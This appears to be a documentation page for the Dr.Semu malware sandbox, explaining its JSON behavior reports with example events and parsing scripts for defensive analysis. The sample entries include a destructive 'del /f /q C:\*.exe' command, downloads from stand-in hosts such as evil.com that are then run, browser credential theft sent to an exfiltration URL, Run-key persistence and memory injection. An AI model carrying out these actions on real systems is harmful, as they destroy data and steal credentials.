@@ -1,0 +1,647 @@
+---
+title: Understanding Reports
+description: Comprehensive guide to Dr.Semu's JSON analysis reports
+---
+
+## Overview
+
+Dr.Semu generates detailed JSON reports capturing all monitored behavior during malware execution. Each process gets its own report file, plus a metadata file linking everything together.
+
+## Report Structure
+
+### Report Directory
+
+After analysis, Dr.Semu creates a temporary directory with a random 15-character name:
+
+```
+C:\DrSemu\xK3mP9nB2qR5vL7\
+├── starter.json    # Metadata about the analysis
+├── 5124.json       # Main process report
+├── 5896.json       # Child process report
+└── 6204.json       # Another child process report
+```
+
+<Warning>
+  Report directories are **automatically deleted** after the verdict is displayed. Preserve them before clicking OK on the final modal dialog.
+</Warning>
+
+### File Naming Convention
+
+- **`starter.json`**: Analysis metadata (sample hash, PIDs, paths)
+- **`<PID>.json`**: Behavioral report for process with that PID
+
+## starter.json
+
+This file contains metadata about the analysis session.
+
+### Structure
+
+```json
+{
+  "image_path": "C:\\samples\\malware.exe",
+  "starter_pid": 5124,
+  "explorer_pid": 4928,
+  "sha_256": "a1b2c3d4e5f6789..."
+}
+```
+
+### Fields
+
+<ParamField path="image_path" type="string">
+  Full path to the analyzed executable on the host system.
+</ParamField>
+
+<ParamField path="starter_pid" type="integer">
+  Process ID of the main (initial) process. This is the PID of the sample you submitted.
+</ParamField>
+
+<ParamField path="explorer_pid" type="integer">
+  Process ID of the fake explorer.exe that Dr.Semu launches to simulate a realistic environment.
+</ParamField>
+
+<ParamField path="sha_256" type="string">
+  SHA-256 hash of the analyzed file, useful for identifying samples in batch analysis.
+</ParamField>
+
+### Example Use Case
+
+Mapping multiple reports back to their original samples:
+
+```python
+import json
+import os
+
+for report_dir in os.listdir('C:\\reports'):
+    starter_file = os.path.join('C:\\reports', report_dir, 'starter.json')
+    with open(starter_file) as f:
+        metadata = json.load(f)
+        print(f"Sample: {metadata['image_path']}")
+        print(f"SHA-256: {metadata['sha_256']}")
+        print(f"Main PID: {metadata['starter_pid']}")
+```
+
+## Process Reports (PID.json)
+
+Each monitored process generates a JSON array of recorded behaviors.
+
+### Overall Structure
+
+```json
+[
+  {
+    "timestamp": 1234567890,
+    "category": "file",
+    "operation": "NtCreateFile",
+    "arguments": { ... },
+    "return_value": "0x00000000"
+  },
+  {
+    "timestamp": 1234567891,
+    "category": "registry",
+    "operation": "NtSetValueKey",
+    "arguments": { ... },
+    "return_value": "0x00000000"
+  }
+]
+```
+
+Each object represents a single monitored system call or API function.
+
+### Common Fields
+
+<ParamField path="timestamp" type="integer">
+  Milliseconds since analysis start. Use this to reconstruct the execution timeline.
+  
+  ```json
+  "timestamp": 1234567890
+  ```
+</ParamField>
+
+<ParamField path="category" type="string">
+  High-level category of the operation:
+  
+  - `file` - Filesystem operations
+  - `registry` - Registry operations
+  - `process` - Process/thread operations
+  - `networking` - Network activity
+  - `com` - COM object creation
+  - `system` - System information queries
+  - `object` - Kernel object operations (mutexes, events, etc.)
+</ParamField>
+
+<ParamField path="operation" type="string">
+  Specific system call or API function name:
+  
+  - **File**: `NtCreateFile`, `NtWriteFile`, `NtDeleteFile`
+  - **Registry**: `NtSetValueKey`, `NtCreateKey`, `NtDeleteKey`
+  - **Process**: `NtCreateUserProcess`, `NtWriteVirtualMemory`
+  - **Network**: `InternetOpenUrlW`, `WSAStartup`, `gethostbyname`
+  - **COM**: `CoCreateInstance`
+</ParamField>
+
+<ParamField path="arguments" type="object">
+  Operation-specific arguments captured from the API call. Structure varies by operation type.
+</ParamField>
+
+<ParamField path="return_value" type="string">
+  Return value or NTSTATUS code from the operation (in hexadecimal).
+  
+  - `0x00000000` = Success (STATUS_SUCCESS)
+  - Other values indicate errors or specific return codes
+</ParamField>
+
+## Category-Specific Formats
+
+### File Operations
+
+#### NtCreateFile / NtOpenFile
+
+```json
+{
+  "timestamp": 1000,
+  "category": "file",
+  "operation": "NtCreateFile",
+  "arguments": {
+    "file_path": "C:\\Users\\Public\\malware.exe",
+    "desired_access": "GENERIC_READ | GENERIC_WRITE",
+    "create_disposition": "CREATE_ALWAYS"
+  },
+  "return_value": "0x00000000"
+}
+```
+
+**Key fields**:
+- `file_path`: Full path to the file
+- `desired_access`: Access rights requested
+- `create_disposition`: Creation mode (e.g., CREATE_ALWAYS, OPEN_EXISTING)
+
+#### NtWriteFile
+
+```json
+{
+  "timestamp": 1050,
+  "category": "file",
+  "operation": "NtWriteFile",
+  "arguments": {
+    "file_path": "C:\\Users\\Public\\malware.exe",
+    "buffer_size": 73728,
+    "buffer_content": "4D5A90000300000004000000FFFF0000..."
+  },
+  "return_value": "0x00000000"
+}
+```
+
+**Key fields**:
+- `buffer_size`: Number of bytes written
+- `buffer_content`: Hex dump of written data (may be truncated)
+
+#### NtDeleteFile
+
+```json
+{
+  "timestamp": 2000,
+  "category": "file",
+  "operation": "NtDeleteFile",
+  "arguments": {
+    "file_path": "C:\\important_data.docx"
+  },
+  "return_value": "0x00000000"
+}
+```
+
+### Registry Operations
+
+#### NtCreateKey / NtOpenKey
+
+```json
+{
+  "timestamp": 1200,
+  "category": "registry",
+  "operation": "NtCreateKey",
+  "arguments": {
+    "key_path": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+    "desired_access": "KEY_SET_VALUE"
+  },
+  "return_value": "0x00000000"
+}
+```
+
+#### NtSetValueKey
+
+```json
+{
+  "timestamp": 1250,
+  "category": "registry",
+  "operation": "NtSetValueKey",
+  "arguments": {
+    "key_path": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+    "value_name": "Malware",
+    "value_type": "REG_SZ",
+    "value_data": "C:\\Users\\Public\\malware.exe"
+  },
+  "return_value": "0x00000000"
+}
+```
+
+**Persistence indicator**: Writing to `Run` keys establishes persistence.
+
+#### NtDeleteKey / NtDeleteValueKey
+
+```json
+{
+  "timestamp": 3000,
+  "category": "registry",
+  "operation": "NtDeleteValueKey",
+  "arguments": {
+    "key_path": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender",
+    "value_name": "DisableAntiSpyware"
+  },
+  "return_value": "0x00000000"
+}
+```
+
+### Process Operations
+
+#### NtCreateUserProcess
+
+```json
+{
+  "timestamp": 1500,
+  "category": "process",
+  "operation": "NtCreateUserProcess",
+  "arguments": {
+    "image_path": "C:\\Windows\\System32\\cmd.exe",
+    "command_line": "cmd.exe /c del /f /q C:\\*.exe",
+    "process_id": 5896
+  },
+  "return_value": "0x00000000"
+}
+```
+
+**Key fields**:
+- `image_path`: Executable being launched
+- `command_line`: Full command line with arguments
+- `process_id`: PID of the new process
+
+#### NtWriteVirtualMemory
+
+```json
+{
+  "timestamp": 1600,
+  "category": "process",
+  "operation": "NtWriteVirtualMemory",
+  "arguments": {
+    "target_pid": 5896,
+    "base_address": "0x00400000",
+    "buffer_size": 4096,
+    "buffer_content": "E8000000005D81ED..."
+  },
+  "return_value": "0x00000000"
+}
+```
+
+**Injection indicator**: Writing to another process's memory.
+
+#### NtProtectVirtualMemory
+
+```json
+{
+  "timestamp": 1650,
+  "category": "process",
+  "operation": "NtProtectVirtualMemory",
+  "arguments": {
+    "base_address": "0x00400000",
+    "size": 4096,
+    "new_protection": "PAGE_EXECUTE_READWRITE",
+    "old_protection": "PAGE_READWRITE"
+  },
+  "return_value": "0x00000000"
+}
+```
+
+**Shellcode indicator**: Changing memory to executable.
+
+### Networking Operations
+
+#### InternetOpenUrlW / InternetOpenUrlA
+
+```json
+{
+  "timestamp": 2500,
+  "category": "networking",
+  "operation": "InternetOpenUrlW",
+  "arguments": {
+    "url": "http://malicious-c2.com/config.bin"
+  },
+  "return_value": "0x00000000"
+}
+```
+
+#### URLDownloadToFileW
+
+```json
+{
+  "timestamp": 2600,
+  "category": "networking",
+  "operation": "URLDownloadToFileW",
+  "arguments": {
+    "url": "http://evil.com/payload.exe",
+    "file_path": "C:\\Users\\Public\\downloaded.exe"
+  },
+  "return_value": "0x00000000"
+}
+```
+
+**Dropper indicator**: Downloading additional payloads.
+
+#### gethostbyname
+
+```json
+{
+  "timestamp": 2400,
+  "category": "networking",
+  "operation": "gethostbyname",
+  "arguments": {
+    "hostname": "malicious-c2.com"
+  },
+  "return_value": "0x00000000"
+}
+```
+
+### COM Operations
+
+#### CoCreateInstance
+
+```json
+{
+  "timestamp": 1800,
+  "category": "com",
+  "operation": "CoCreateInstance",
+  "arguments": {
+    "clsid": "{00021401-0000-0000-C000-000000000046}",
+    "interface": "IShellLink"
+  },
+  "return_value": "0x00000000"
+}
+```
+
+### System Operations
+
+#### NtQuerySystemInformation
+
+```json
+{
+  "timestamp": 3500,
+  "category": "system",
+  "operation": "NtQuerySystemInformation",
+  "arguments": {
+    "information_class": "SystemProcessInformation"
+  },
+  "return_value": "0x00000000"
+}
+```
+
+**Evasion indicator**: Enumerating running processes (e.g., looking for analysis tools).
+
+### Object Operations
+
+#### NtCreateMutant
+
+```json
+{
+  "timestamp": 500,
+  "category": "object",
+  "operation": "NtCreateMutant",
+  "arguments": {
+    "mutex_name": "Global\\MalwareMutex123"
+  },
+  "return_value": "0x00000000"
+}
+```
+
+**Anti-reinfection**: Mutexes prevent multiple instances.
+
+## Analysis Examples
+
+### Example 1: Ransomware Behavior
+
+Typical ransomware report excerpt:
+
+```json
+[
+  {
+    "timestamp": 1000,
+    "category": "registry",
+    "operation": "NtSetValueKey",
+    "arguments": {
+      "key_path": "HKCU\\Software\\Ransom",
+      "value_name": "ID",
+      "value_data": "ABC123"
+    }
+  },
+  {
+    "timestamp": 2000,
+    "category": "file",
+    "operation": "NtCreateFile",
+    "arguments": {
+      "file_path": "C:\\Users\\Documents\\file.docx"
+    }
+  },
+  {
+    "timestamp": 2100,
+    "category": "file",
+    "operation": "NtWriteFile",
+    "arguments": {
+      "file_path": "C:\\Users\\Documents\\file.docx",
+      "buffer_content": "[ENCRYPTED DATA]"
+    }
+  },
+  {
+    "timestamp": 2200,
+    "category": "file",
+    "operation": "NtSetInformationFile",
+    "arguments": {
+      "file_path": "C:\\Users\\Documents\\file.docx",
+      "new_name": "file.docx.encrypted"
+    }
+  }
+]
+```
+
+**Indicators**:
+1. Registry key for victim ID
+2. Opening user documents
+3. Overwriting with encrypted data
+4. Renaming files
+
+### Example 2: Dropper Behavior
+
+```json
+[
+  {
+    "timestamp": 1000,
+    "category": "networking",
+    "operation": "URLDownloadToFileW",
+    "arguments": {
+      "url": "http://evil.com/stage2.exe",
+      "file_path": "C:\\Users\\Public\\stage2.exe"
+    }
+  },
+  {
+    "timestamp": 2000,
+    "category": "process",
+    "operation": "NtCreateUserProcess",
+    "arguments": {
+      "image_path": "C:\\Users\\Public\\stage2.exe",
+      "command_line": "stage2.exe",
+      "process_id": 6204
+    }
+  },
+  {
+    "timestamp": 3000,
+    "category": "file",
+    "operation": "NtDeleteFile",
+    "arguments": {
+      "file_path": "C:\\Users\\Public\\stage2.exe"
+    }
+  }
+]
+```
+
+**Workflow**:
+1. Download next stage
+2. Execute downloaded payload
+3. Delete evidence
+
+### Example 3: Information Stealer
+
+```json
+[
+  {
+    "timestamp": 1000,
+    "category": "file",
+    "operation": "NtOpenFile",
+    "arguments": {
+      "file_path": "C:\\Users\\AppData\\Roaming\\Browser\\Login Data"
+    }
+  },
+  {
+    "timestamp": 2000,
+    "category": "networking",
+    "operation": "InternetOpenUrlW",
+    "arguments": {
+      "url": "http://exfil-server.com/upload"
+    }
+  }
+]
+```
+
+## Parsing Reports
+
+### Python Example
+
+```python
+import json
+import os
+
+def analyze_report(report_path):
+    with open(report_path) as f:
+        events = json.load(f)
+    
+    # Count operations by category
+    categories = {}
+    for event in events:
+        cat = event.get('category', 'unknown')
+        categories[cat] = categories.get(cat, 0) + 1
+    
+    # Find persistence mechanisms
+    persistence = []
+    for event in events:
+        if event.get('category') == 'registry':
+            if 'Run' in event['arguments'].get('key_path', ''):
+                persistence.append(event)
+    
+    # Network indicators
+    network_iocs = []
+    for event in events:
+        if event.get('category') == 'networking':
+            if 'url' in event['arguments']:
+                network_iocs.append(event['arguments']['url'])
+    
+    return {
+        'operation_counts': categories,
+        'persistence': persistence,
+        'network_iocs': network_iocs
+    }
+
+result = analyze_report('5124.json')
+print(json.dumps(result, indent=2))
+```
+
+### PowerShell Example
+
+```powershell
+# Load report
+$report = Get-Content "5124.json" | ConvertFrom-Json
+
+# Find file deletions
+$deletions = $report | Where-Object { $_.operation -eq "NtDeleteFile" }
+
+# Find registry persistence
+$persistence = $report | Where-Object {
+    $_.category -eq "registry" -and
+    $_.arguments.key_path -like "*\Run*"
+}
+
+# Extract URLs
+$urls = $report | Where-Object { $_.arguments.url } | Select-Object -ExpandProperty arguments | Select-Object url
+
+Write-Output "Deleted files: $($deletions.Count)"
+Write-Output "Persistence entries: $($persistence.Count)"
+Write-Output "Network URLs: $($urls.Count)"
+```
+
+## Best Practices
+
+<AccordionGroup>
+  <Accordion title="Preserve Reports Immediately">
+    Copy report directories before clicking OK on the completion modal:
+    ```bash
+    robocopy C:\DrSemu\xK3mP9nB2qR5vL7 C:\reports\sample1 /E
+    ```
+  </Accordion>
+  
+  <Accordion title="Correlate with starter.json">
+    Always use `starter.json` to map PIDs back to samples:
+    ```python
+    starter = json.load(open('starter.json'))
+    main_report = json.load(open(f"{starter['starter_pid']}.json"))
+    ```
+  </Accordion>
+  
+  <Accordion title="Filter Noise">
+    Focus on high-value operations:
+    - Registry persistence keys
+    - File writes to system directories
+    - Process injection
+    - Network communication
+  </Accordion>
+  
+  <Accordion title="Timeline Reconstruction">
+    Use `timestamp` fields to reconstruct attack timeline:
+    ```python
+    sorted_events = sorted(events, key=lambda x: x['timestamp'])
+    ```
+  </Accordion>
+</AccordionGroup>
+
+## Next Steps
+
+<CardGroup cols={2}>
+  <Card title="Analyzing Samples" icon="microscope" href="/usage/analyzing-samples">
+    Learn the complete analysis workflow
+  </Card>
+  <Card title="Architecture" icon="diagram-project" href="/architecture/overview">
+    Understand how Dr.Semu generates these reports
+  </Card>
+</CardGroup>
